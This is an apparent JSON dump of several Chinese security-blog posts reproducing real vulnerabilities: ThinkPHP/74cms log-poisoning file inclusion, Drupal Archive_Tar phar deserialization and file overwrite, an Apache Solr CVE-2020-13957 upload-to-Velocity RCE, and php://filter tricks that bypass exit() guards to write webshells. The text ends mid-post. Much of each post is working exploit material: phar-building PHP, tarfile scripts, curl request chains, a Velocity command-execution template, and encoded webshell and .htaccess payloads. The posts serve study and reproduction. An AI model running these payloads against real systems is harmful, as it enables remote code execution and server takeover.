的原生漏洞)，这样的话，通过上传恶意文件，然后再实现文件包含，仍然能够造成命令执行。 这个是受局限的 bmp 图片文件，要进一步实现利用，还是需要进一步分析一下绕过 php_gd 的方法。 Thinkphp 3.2.3 原生问题 所有漏洞的触发过程全部实现在 thinkphp3 内部框架之内，是因为进行模板解析之前没有控制传入模板的路径，解析的过程中也没有过滤模板内文件的内容，解析编译之后直接通过 include 方式将模板文件进行了包含。 我们在 Home 模块下添加一个 Whippet 控制器 http://74cms.test/index.php?m=home&amp;c=whippet&amp;a=index&amp;variable=1&amp;tpl=&lt;?php phpinfo(); ob_flush();?&gt; http://74cms.test/index.php?m=home&amp;c=whippet&amp;a=index&amp;variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_22.log 可以注意到在脱离了骑士cms的文件内容之后，利用自写的模块也能成功触发漏洞，整个漏洞触发的过程与之前完全一致。这个漏洞其实本质上就是 thinkphp3框架中本身的问题，如果有程序基于 thinkphp3 的框架，并且调用了 Contolller 控制器中的 fetch 方法，模板的路径自定义，就可以触发这个漏洞。 Thinkcmf 的任意文件包含 大致看了一下 ThinkCmf 中的任意文件包含漏洞，没有调试，但是发现大致原理是相同的，最后触发的位置也相同。/具体不做分析了/，而且发现，thinkcmf 上的 payload 放在 骑士cms 也是可行的，有时间还是再看一下 thinkcmf 看一下是否存在新的问题。还是有一些不同的，不能一概而论。 http://74cms.test/index.php?m=home&amp;c=whippet&amp;a=index&amp;variable=1&amp;tpl=&lt;?php file_put_contents(\"shell.php\",\"&lt;?php phpinfo();?&gt;\");?&gt; http://74cms.test/index.php?m=home&amp;c=whippet&amp;a=index&amp;variable=1&amp;tpl=data/Runtime/Logs/Home/20_12_22.log 参考文章 骑士cms &lt; 6.0.48任意文件包含漏洞简记 骑士cms从任意文件包含到远程代码执行漏洞分析 骑士 CMS 远程命令执行分析 这个漏洞，我劝你耗子尾汁 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Drupal(CVE-2020-28948&CVE-2020-28949)分析","slug":"Drupal(CVE-2020-28948&CVE-2020-28949)分析","date":"2020-12-10T01:57:16.000Z","updated":"2021-03-09T15:57:27.160Z","comments":true,"path":"2020/12/10/Drupal(CVE-2020-28948&CVE-2020-28949)分析/","link":"","permalink":"http://yoursite.com/2020/12/10/Drupal(CVE-2020-28948&CVE-2020-28949)%E5%88%86%E6%9E%90/","excerpt":"漏洞简介 前段时间 drupal 更新了一则安全通告,主要因为 PEAR 的 Archive_Tar 模块存在 CVE-2020-28948/CVE-2020-28949 漏洞。drupal 集成了带漏洞的 Archive_Tar 模块，所以存在被利用的风险。实际利用非常苛刻，应该是并不能无法直接利用成功的","text":"漏洞简介 前段时间 drupal 更新了一则安全通告,主要因为 PEAR 的 Archive_Tar 模块存在 CVE-2020-28948/CVE-2020-28949 漏洞。drupal 集成了带漏洞的 Archive_Tar 模块，所以存在被利用的风险。实际利用非常苛刻，应该是并不能无法直接利用成功的 漏洞复现 这一部分描述可能会比较繁琐，我将我在其中遇见的所有问题以及自己的思考全部记录下。 环境搭建 首先是搭建环境，我们选取Drupal 9.0.8作为复现漏洞的版本。选取 phpstudy 自带的 apache + mysql 环境来进行安装，安装时出现了问题，前前后后一直安装不上，安装之后除了首页均显示 404 页面。通过查询发现是因为在安装时提示 drupal 没有开启简洁配置。开启drupal的简洁配置有两种操作(1)开启 Apache 服务器支持 mod_rewrite.so 模块。(2)修改 Drupal 根目录下的 .htaccess 文件，同时修改 httpd.conf 中的 AllowOverride ，使 Apache可以加载 web 目录下的 .htaccess文件。 后来仔细一看，发现安装过程中 drupal 根目录下的 .htaccess 文件变成空了，所以又将 .htaccess 提取了一份复制到根目录下就成功了这个东西也看人品，在虚拟机中安装时，并没有任何错误 照猫画虎 刚开始分析的时候借鉴的网上的一篇文章 Drupal(CVE-2020-28948/CVE-2020-28949)分析 想着先按照操作来执行一遍。 payload 12345678910111213141516171819202122232425262728293031&lt;?phpnamespace GuzzleHttp\\Psr7;class FnStream{ private $methods; public function __construct(array $methods) { $this-&gt;methods = $methods; foreach ($methods as $name =&gt; $fn) { $this-&gt;{'_fn_' . $name} = $fn; } } public function __destruct() { if (isset($this-&gt;_fn_close)) { call_user_func($this-&gt;_fn_close); } }}$test[\"close\"]=\"phpinfo\";$c = new FnStream($test);$phar = new \\Phar(\"test.phar\");$phar-&gt;startBuffering();$phar-&gt;addFromString(\"test.txt\",\"test\");$phar-&gt;setStub(\"&lt;?php__HALT_COMPILER(); ?&gt;\");$phar-&gt;setMetadata($c);$phar-&gt;stopBuffering();?&gt; 1234import tarfiletar = tarfile.open('test.tar','w')tar.add('test.phar','PHAR://test.phar')tar.close() 找到上传 tar 的位置 先把tar上传上去 http://test.test/admin/config/development/configuration/full/import 上传之后直接报错了，我们根据报错信息进行全局搜索 core/modules/config/src/Form/ConfigImportForm.php 此时我们先把 $archiver-&gt;extractList($files, $this-&gt;settings-&gt;get('config_sync_directory'), '', FALSE, FALSE); 修改为 $archiver-&gt;extractList($files, '', '', FALSE, FALSE); 具体原因稍后再进行分析 这个时候出现了新的错误，提示找不到phar文件，于是我们将生成的 phar 文件拷贝到 Drupal 的根目录下。 我们再次根据报错信息进行分析，发现在 src/FnStream.php文件中的 __wakeup() 方法，可见此时已经触发了反序列化方法，但是因为 Fnstream 禁止反序列化，所以并未成功。 到这个地方已经基本上证实了可以通过这种修改文件名的方法来触发 phar:// 反序列化。 为了进一步的显示实验效果，我们把这个方法注释掉，然后再一次的执行。 可能这种方式存在偶然性，好几次才成功了一次 先初步总结一下在 drupal 上利用成功的前提条件 登录成功后台，上传 tar 包 上传已知路径的 .phar 文件 &lt;无法满足，通过修改文件名后缀等方法，并不能上传成功&gt; 设置 path 为 空 &lt;无法满足，$this-&gt;settings-&gt;get('config_sync_directory') 无法设置为空&gt; 寻址一条可利用的反序列化链 √ FnStream.php 的反序列化链受限 可以直接通过 Tar.php 的反序列化链 所以这个可能仅仅针对 drupal 是一个风险，并不存在这样的漏洞 然后是任意文件覆盖 1234import tarfiletar = tarfile.open('test.tar','w')tar.add('whippet.txt','file:///E://1.txt')tar.close() 漏洞分析 我们通过 drupla 的官方通告 可以知道是因为 PEAR 的 Archive_Tar 模块存在漏洞，所以我们首先是对 Archive_Tar 这个漏洞进行分析。 我们根据 github 上的 Archive_Tar issues 来进行具体的分析，首先我们能够知道的是，Archive_Tar 在之前是存在漏洞的，修复的方法是 通过指定 tar 包含指定为恶意文件名 PHAR://exploit.phar (使用大写字母表示) 尽管 Archive_Tar 尝试防御 phar 的反序列化，但是其他的流包装器并未被检查，可以通过指定 tar 包含指定恶意文件名 file///etc/passwd 如果 php 进程在特权用户下运行，这使攻击者可以覆盖 /etc/passwd 或 /etc/shadow。 我们可以看到提供的 poc 的验证文件为 跟进 extract 跟进 extractModify 跟进_extractList translatewinpath 把前面传过来的路径重新转义之后赋值给 $p_path，在这里$p_path 前面没有传值为空。 接着向下 跟进 _readHeader 继续之后发现了_maliciousFilename 跟进 _maliciousFilename 想办法绕过这个验证，继续回到函数 _extractList 首先是将 $p_path 拼接到文件名之前，然后调用 file_exists 判断文件是否存在，如果存在时因为文件名为 PHAR://xxx.phar，会触发 phar 反序列化去解析那个指定的文件。 这里调用的反序列化链为 可以实现任意文件删除 123456789101112131415&lt;?phpclass Archive_Tar { public $_temp_tarname; function __construct($_temp_tarname) { $this-&gt;_temp_tarname = $_temp_tarname; }}$phar = new Phar('exploit.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('whatever', 'whatever');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');$phar-&gt;setMetadata(new Archive_Tar('unserialize_test'));$phar-&gt;stopBuffering(); 针对 drupal 这个漏洞，仅仅属于一个风险警告，因为需要满足的条件有些多，并不能一一满足。 core/modules/config/src/Form/ConfigImportForm.php Archive/Tar.php 后面的基本相同，需要满足的是 file_exists，在前面传参时 $p_path 的数值被指定为 $this-&gt;settings-&gt;get('config_sync_directory') 所以只能手动指定为空了，再一个就是要上传上 phar 文件，去指定解析，因为 drupal 并不能通过修改后缀就指定成功，所以也是手动拷贝 phar 文件到根目录了。 参考文章 Drupal(CVE-2020-28948/CVE-2020-28949)分析 PEAR Archive_Tar 安全漏洞 Archive_Tar issues document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"CVE-2020-13957 Apche Solr 未授权上传漏洞","slug":"CVE-2020-13957 Apche Solr 未授权上传漏洞","date":"2020-10-26T08:04:32.000Z","updated":"2021-03-09T15:57:27.158Z","comments":true,"path":"2020/10/26/CVE-2020-13957 Apche Solr 未授权上传漏洞/","link":"","permalink":"http://yoursite.com/2020/10/26/CVE-2020-13957%20Apche%20Solr%20%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"前言 Apache Solr 发布公告，旧版本的 ConfigSet API 中存在未授权上传漏洞风险，被利用可能导致 RCE （远程代码执行）。","text":"前言 Apache Solr 发布公告，旧版本的 ConfigSet API 中存在未授权上传漏洞风险，被利用可能导致 RCE （远程代码执行）。 影响版本 Apache Solr6.6.0 -6.6.5 Apache Solr7.0.0 -7.7.3 Apache Solr8.0.0 -8.6.2 环境搭建 项目地址 为了方便之后的调试工作，我们下载源代码，利用 ant + ivy 进行编译 12345ant ivy-bootstrap //安装ivycd solrant servercd ..ant idea 为了加快下载的速度，在根目录下的 bulid.xml &amp; /solr/build.xml 中都添加代理地址 1&lt;setproxy proxyhost=\"127.0.0.1\" proxyport=\"1080\"/&gt; 来来回回环境依赖下载了好多天，快要下载到我心灵崩溃。最后反反复复，终于确定了一件事情，太过老旧的版本并不适合去进行编译，因为他们访问 maven 依赖的方法还是利用 http，而现如今只能通过 https 来进行访问，所以无论是再怎么利用手机开热点，再怎么更换代理节点，带给我的结果只有 ERROR。 下载项目 来进行编译 漏洞复现 12cd \\solr\\bin solr.cmd start -e cloud 启动SolrCloud，访问 http://127.0.0.1:8983 首先进行一个恶意的配置 solr\\server\\solr\\configsets\\sample_techproducts_configs\\conf\\solrconfig.xml 12&lt;str name=\"solr.resource.loader.enabled\"&gt;${velocity.solr.resource.loader.enabled:true}&lt;/str&gt;&lt;str name=\"params.resource.loader.enabled\"&gt;${velocity.params.resource.loader.enabled:true}&lt;/str&gt; 👇 攻击过程： 利用方法一 将 solr\\server\\solr\\configsets\\sample_techproducts_configs\\conf 目录下的所有文件，打包成一个压缩文件 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @mytest.zip \"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=mytest\" #注册一个配置文件集合为mytest curl \"http://127.0.0.1:8983/api/cluster/configs?omitHeader=true\" #查询配置文件集合是否上传成功 curl \"http://127.0.0.1:8983/solr/admin/configs?action=CREATE&amp;name=mytest1&amp;baseConfigSet=mytest&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true\" #根据UPLOAD的配置，创建一个新的配置，绕过不能通过直接UPLOAD创建collection的限制 curl \"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=mytest2&amp;numShards=1&amp;collection.configName=mytest1\" curl -g -v \"http://127.0.0.1:8983/solr/mytest2/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" # 执行命令 利用方法二 将 solr\\server\\solr\\configsets\\sample_techproducts_configs\\conf 目录下的所有文件，打包成一个压缩文件 curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @mytest.zip \"http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=mytest\" #注册一个配置文件集合为mytest curl -v \"http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=mytest1&amp;numShards=2&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=mytest\" #选择恶意的solrconfig.xml创建新的Collection curl -g -v \"http://127.0.0.1:8983/solr/mytest1/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" # 执行命令 网络漏洞分析 编译成功后将源代码导入 idea 当中，开启 solr 并设置 debug 模式 1234cd \\solr\\bin solr.cmd start -e cloudsolr.cmd stop -allsolr.cmd -c -f -a \"-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=18522\" -p 8983 漏洞的利用需要开启 solrcloud ，前期想着通过一条命令开启 debug 模式的同时，也开启 solrcloud ，但是经过不断的测试，发现是不能成功的，在师傅博客之上看见，通过创建两个文件夹去做这个事情，既搞不清楚原理，操作起来也非常麻烦。但是偶然之间，发现先开启 solrcolud 之后，配置文件也会因此而生成，停止所有的 slor 服务之后，再启动 debug 就可以成功了。 在 idea 中配置远程调试的参数 在网上的文章找那个会经常出现模板这个名词，为了防止指代不明，本文章的所有模板均指的是Veloctiy 模板。关于solr上的相关名词 创建 collection 的配置文件就称之为config_set。 当传入 zip 配置文件去生成一个config_set时，会调用 getTrusted 函数进行判断是否允许创建该配置: curl -X POST --header “Content-Type:application/octet-stream” --data-binary @mytest.zip “http://127.0.0.1:8983/solr/admin/configs?action=UPLOAD&amp;name=mytest” org/apache/solr/handler/admin/ConfigSetsHandler.java org.apache.solr.handler.admin.ConfigSetsHandler#getTrusted 虽然配置文件集被标记为不值得信任的（缺少身份验证），但是还是创建了该config_set。 curl “http://127.0.0.1:8983/solr/admin/configs?action=CREATE&amp;name=mytest1&amp;baseConfigSet=mytest&amp;configSetProp.immutable=false&amp;wt=xml&amp;omitHeader=true” 根据刚才上传的 config_set 去生成一个新的 config_set1 org.apache.solr.handler.admin.ConfigSetsHandler.ConfigSetOperation 我们注意到，在利用之前上传的 config_set 创建新的 config_set1 的时候，并未触发 getTrusted 断点，这也就意味着，在 CREATE 通过母版创建子版的时候并没有触发校验。 此时再根据创建的 config_set1 去创建 collections 来调用solr组件进行远程代码执行 curl “http://127.0.0.1:8983/solr/admin/collections?action=CREATE&amp;name=mytest2&amp;numShards=1&amp;collection.configName=mytest1” 执行命令 curl -g -v \"http://127.0.0.1:8983/solr/mytest2/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" 进一步思考 关于根据 config_set1 创建 collections 以及创建出的 collections 为何能够实现远程代码执行，此处暂时先不讲。 我们需要深入分析的问题目前有两个： 为什么通过直接上传的 config_set 不能创建 collections ？ 为什么通过直接上传的 config_set 又可以创建 collections ？ 这两个问题看似自相矛盾，其实就代表的网上关于这个漏洞的两种利用方法。 一个是要重新创建一个配置，另一个是直接就可以，直到我在源码里面看到了这个 replicationFactor 并不是一个什么特殊的参数，仅仅是创建 collections 时可有可无的参数，与这个漏洞并没有很大的关系。至于网上的第一篇文章在讲述为什么用通过 config_set 去创建 config_set1 之后才能创建 collections 我猜测可能是因为通过图形化去创建，触发了什么别的校验而没有成功？通过命令行的 api 接口去进行创建时就ok了。可见不能完全照抄网上的分析。 我笑了，原来这么长时间就分析了个寂寞，事实的真相可能就是，即使未通过身份校验，上传的 config_set 也会直接写入服务器内，然后通过该 config_set 去创建 collections，然后通过 collections 进行模板渲染命令执行。 Velocity模版远程命令执行 Apche Solr 未授权上传漏洞(CVE-2020-13957) 通过上传恶意模板，进而导致的远程命令执行，造成远程命令执行的原因是 Apache Solr Velocity 注入远程命令执行漏洞(CVE-2019-17558)。 由于 Solr 默认未开启登录认证，只需要请求/节点/config，将配置项 params.resource.loader.enabled 设置为 true ，再构造链接让 Solr 中的 Velocity 模板引擎渲染传入恶意模板，造成命令执行。 Velocity Velocity是一个基于Java的模板引擎，其提供了一个Context容器，在java代码里面我们可以往容器中存值，然后在vm文件中使用特定的语法获取，这是velocity基本的用法，其与jsp、freemarker并称为三大视图展现技术，相对于jsp而言，velocity对前后端的分离更加彻底：在vm文件中不允许出现java代码，而jsp文件中却可以。 如果我们模板 test.vm 内容如下时， Velocity 将会执行命令，并显示执行结果。 12345678910#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('whoami'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read()))#end 所以当以 Velocity 为模板渲染引擎，如果渲染的模板内容可控的话，就可以通过构造恶意模板来执行任意命令。 漏洞分析 POC代码为 curl -g -v \"http://127.0.0.1:8983/solr/mytest2/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x='')+%23set($rt=$x.class.forName('java.lang.Runtime'))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27whoami%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" solr 在查询数据结束之后，会根据 wt 参数的值来确定数据返回的格式，可以是 XML、JSON、CSV,Veloctiy 模板渲染等，漏洞触发为使用 Veloctiy 模板渲染来返回查询数据结果。 org.apache.solr.response.QueryResponseWriter 根据 wt 确定数据处理的对象，core 为选择创建的 collection。 org.apache.solr.core.SolrCore#getQueryResponseWriter(java.lang.String) QueryResponseWriter 的类型为 VelocityResponseWriter，然后跟进到 org.apache.solr.response.VelocityResponseWriter#write 初始化模板引擎 采用了 createEngine 方法 org.apache.solr.response.VelocityResponseWriter#createEngine 如果 paramsResourceLoaderEnabled 的值为 true，程序会创建一个参数资源加载器对象，即模板内容是前端传入的参数。所以设定config_set时要满足 velocity.params.resource.loader.enabled:true，这样创建出来的 collection 才可行。 可以看到经过 new SolrParamResourceLoader(request) 的处理 custom.vm 中存储了会执行的命令。 org.apache.solr.response.SolrParamResourceLoader#SolrParamResourceLoader SolrParamResourceLoader 会解析前端传进的所有参数，并对 v.template. 开头的参数进行处理，截断 v.template. 并拼接 .vm，再传入前端传进的所有参数。 经过处理初始化模板引擎之后又返回最开始的函数 org.apache.solr.response.VelocityResponseWriter#write 紧接着加载模板文件 跟进 org.apache.solr.response.VelocityResponseWriter#getTemplate 在获取模板的对象的时候，将前端传入的参数 v.template 的值拼接 .vm，得到 custom.vm，就是上一步初始化时传入的恶意模板。加载的模板文件就是 custom.vm。 紧接着就是进行合并渲染 漏洞因此触发。 大概的一个触发流程可以这么理解，初始化模板引擎时创建了一个恶意模板，在加载模板时选择了初始化时创建的恶意模板，最后进行合并渲染的时候触发了 Velocity的远程命令执行。 参考文章 CVE-2020-13957 Apache Solr 未授权上传漏洞复现&amp;&amp;分析 Apache solr Velocity模版远程命令执行漏洞分析 Apache-Solr-Vulnerability document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"file_put_contents & php://filter","slug":"file_put_contents","date":"2020-09-30T02:00:00.000Z","updated":"2021-03-09T15:57:27.160Z","comments":true,"path":"2020/09/30/file_put_contents/","link":"","permalink":"http://yoursite.com/2020/09/30/file_put_contents/","excerpt":"前言 昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php://filter 协议来实现的。平时，利用 php://filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php://filter 对 file_put_content 中几种情况的绕过方法。","text":"前言 昨天在网上看到一道 ctf 题目，花费了很长时间都没有解出来，后来看到大佬的解题思路，主要是利用了 php://filter 协议来实现的。平时，利用 php://filter 主要是实现任意文件读取，对他的其他利用尚不是很清楚，网上有很多大佬都写了非常详细的文章。自己也做一个简单的总结。主要是探讨 php://filter 对 file_put_content 中几种情况的绕过方法。 file_put_contents($filename,\"&lt;?php exit();\".$content); file_put_contents($content,\"&lt;?php exit();\".$content); file_put_contents($filename,$content . “\\nxxxxxx”); file_put_contents($filename,\"&lt;?php exit();\".$content); 首先是最为简单的一种方法，$filename 控制写入的文件名，$content 拼接在了 &lt;?php exit(); 之后。 想要 getshell 的话，必须将前面的 &lt;?php exit(); 闭合或者消除。 $filename 控制文件名，可以利用 php://filter 协议对 $content 进行解码，同时 php://filter 可以支持使用多个过滤器规则。实现的思路就为：将 ?php exit(); 解码成为 php 不认识的字符，构造的内容能够正常解码。 0x01 Base64编码 Base64 编码是使用64个可打印的 ASCII 字符（A-Z、a-z、0-9、+、/） 将任意字节序列化数据编码成 ASCII 字符串，另有 = 作为后缀的用途。同时 base64_decode 在遇到不在其中的字符时，会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。 当 $content 被加上&lt;?php exit(); 之后，我们可以利用 php://filter/write=convert.base64-decode 来实现对其进行解码。 在进行解码的过程中不符合 base64 编码范围的字符将被忽略，所以最后被 base64 解码的字符为 phpexit 和我们传入的其他字符。 由于 phpexit 一共七个字符，base64 在算法解码时是4个 byte 一组，所以为他随意添加一个字符（a）就可以，这样 aphpexit 会被 base64 正常的解析，后面传入的 webshell 也会被正常的解码。这样就会将 &lt;?php exit(); 这部分内容被正常的解码，不会影响后面写入的 webshell 的内容。 0x02 Rot13编码 &lt;?php exit(); 在经过 rot13 编码之后会变成 &lt;?cuc rkvg(); ，通过再传入一个 ?&gt; 将其闭合 同时，在 php 不开启 short_open_tag 短标签时，php 无法识别这个字符串。 0x03 .htaccess的预包含利用 利用 .htaccess 的预包含文件功能，自定义包含文件。 看到网上的文章的利用方法为 12$filename='php://filter/write=string.strip_tags/resource=.htaccess'$content='?&gt;php_value%20auto_prepend_file%20G:\\s1mple.php' 我尝试了多次之后无法利用成功，随即又被指导另一种方法 在 .htaccess 中写入 Options +ExecCGI AddHandler fcgid-script .abc FcgidWrapper \"C:/Windows/System32/cmd.exe /c start cmd.exe\" .abc 然后再随意生成一个 .abc 后缀的文件，访问就可以打开 cmd 控制框。 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=.htaccess'$content='?&gt;T3B0aW9ucyArRXhlY0NHSQ0KQWRkSGFuZGxlciBmY2dpZC1zY3JpcHQgLmFiYw0KRmNnaWRXcmFwcGVyICJDOi9XaW5kb3dzL1N5c3RlbTMyL2NtZC5leGUgL2Mgc3RhcnQgY21kLmV4ZSIgLmFiYw==' emmmm，这样似乎多此一举，为什么我不直接写一个shell进去呢，而要采用这种比较麻烦的利用方式，还是要想办法找出之前的利用方法一直无法成功的原因。 不断不断测试，发现是自己的 windows 机器上没有开启对 php_value 的支持，配置了好久发现无法成功，于是采用 ubuntu 环境进行测试。 http://192.168.176.128/?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?%3Ephp_value%20auto_prepend_file%20flag 0x04 过滤器编码组合利用 可用过滤器列表 利用 strip_tags — 从字符串中去除 HTML 和 PHP 标记 12$filename='php://filter/string.strip_tags|convert.base64-decode/resource=whippet.php ';$content = '?&gt;PD9waHAgcGhwaW5mbygpOz8+'; 利用 string.strip_tags 过滤掉 html 标签，将标签内的所有内容删除，然后再进行 base64 解码，成功写入 php 文件。 但是 string.strip_tags 在 php7.3.0 以上的环境会发生错误，无法写入，但在 php5 的环境下不受影响。 利用压缩过滤器，组合使用压缩后再解压内容肯定不变，但是在中间再加入别的过滤器就有可能绕过 12$filename='php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=whippet.php';$content = '?&gt;&lt;?php phpinfo();?&gt;'; file_put_contents($content,\"&lt;?php exit();\".$content); 这种情况主要是针对于写入的 shell 的文件名和文件内容变量相同时的一种绕过，这种方式需要考虑文件名和文件内容数据的兼容性。 0x01 Base64编码 (无法利用) 仅仅只利用 base64 编码的方式是无法利用成功的，利用 php://filter 来构造 POC ，后面属于写入的内容，只要在解码的时候把传入的 shell 正常解码出来，不需要的东西解析成乱码。base64 构造的 poc。 12$content = \"php://filter/convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=whippet.php\"$content = \"php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php\" 构造的shell 可以放在过滤器的位置和文件名的位置都是可以的， php://filter 在面对不可用的规则时仅仅报 Warning，然后跳过继续执行。所以构造是没有太大的问题的。但是测试发现，虽然可以生成文件，但是生成的文件内部为空。 我们可以将要进行 base64 解码的数据提取出来进行分析 phpexitphp//filter/convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/resource=whippet.php 我们注意到在数据中存在 =，默认情况之下 = 在 base64编码中起填充作用，也就意味着结束了。在利用协议时 resource 关键字，不可或缺，所以会导致过滤器解码失败，会首先创建文件，但是解码过程出错，内容全部抛弃，所以仅仅会创建一个空文件。 简单验证一下 = 在 base64解码中所产生的影响 123&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=\")&gt;&gt;&gt; base64.b64decode(\"PD9waHAgQGV2YWwoJFBPU1RbY21kXSk7ID8+=a\") 验证之后发现，在 base64 解码时字符 = 后面不能包含有其他的字符。 0x02 Rot13编码 rot13 编码就不存在 base64 编码的问题，所以可以轻松构造出 $content = \"php://filter/string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=whippet.php\" 0x03 iconv字符编码转换 convert.iconv. 这个过滤器需要 php 支持 iconv。使用 convert.iconv.* 过滤器等同于使用 iconv() 函数处理所有的流数据。 usc-2 通过 usc-2 的编码进行转换，对目标字符串进行2位一反转，因为是两位一反转，所以字符的数目需要保持在偶数位上。 12#echo iconv(\"UCS-2LE\",\"UCS-2BE\",'&lt;?php phpinfo();?&gt;'); ?&lt;hp phpipfn(o;)&gt;? $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?|/resource=whippet.php\" usc-4 通过 usc-4 的编码进行转换，对目标字符串进行4位一反转；所以构造的 shell 的代码数目应该是4的倍数，同时也要保证shell之前的字符串也应该为4个字符一组。 12#echo iconv(\"UCS-4LE\",\"UCS-4BE\",'aa&lt;?php phpinfo();?&gt;');?&lt;aa phpiphp(ofn&gt;?;) $content = \"php://filter/convert.iconv.UCS-4LE.UCS-4BE|?&lt;aa phpiphp(ofn&gt;?;)|/resource=whippet.php\" utf8-utf7 convert.iconv 这个过滤器会把 = 转换为 +AD0-，而 +AD0- 是可以被 base64 进行解码的。 1234#echo iconv(\"UTF-8\",\"UTF-7\",\"=\");+AD0-SSS#echo iconv(\"UTF-8\",\"UTF-7\",\"PD9waHAgcGhwaW5mbygpOz8+\");PD9waHAgcGhwaW5mbygpOz8+- 纯字符之间进行 utf 转换之后还是其本身；所以不受影响。所以可以利用组合拳来利用成功。 1utf-8:&lt;?php exit();php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|PD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php 👇 1utf-7:+ADw?php exit()+ADs-php://filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-PD9waHAgcGhwaW5mbygpOz8+--+AHw-/resource+AD0-whippet.php //这里需要注意的是要符合base64解码按照4字节进行的，base64解码特点剔除不符合字符（只要恶意代码前面部分正常就可以，长度为4的倍数） 1234&gt;&gt;&gt; len(\"+ADwphpexit+ADsphp//filter/converticonvutf8utf7+AHwconvertbase6-decode+AHw\")74&gt;&gt;&gt; 74/418.5 所以在恶意代码之前添加两个字符满足解码条件。 $content=\"php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+-|/resource=whippet.php\" 0x04 过滤器编码组合利用 UCS-2&amp;rot13 $content = \"php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;uc cucvcsa(b;)&gt;?|string.rot13/resource=whippet.php\" strip_tags&amp;base64 (仅可在linux下利用成功) ① &lt;?php exit(); ?&gt; 可以直接利用 strip_tags 去除，尝试构造 payload。 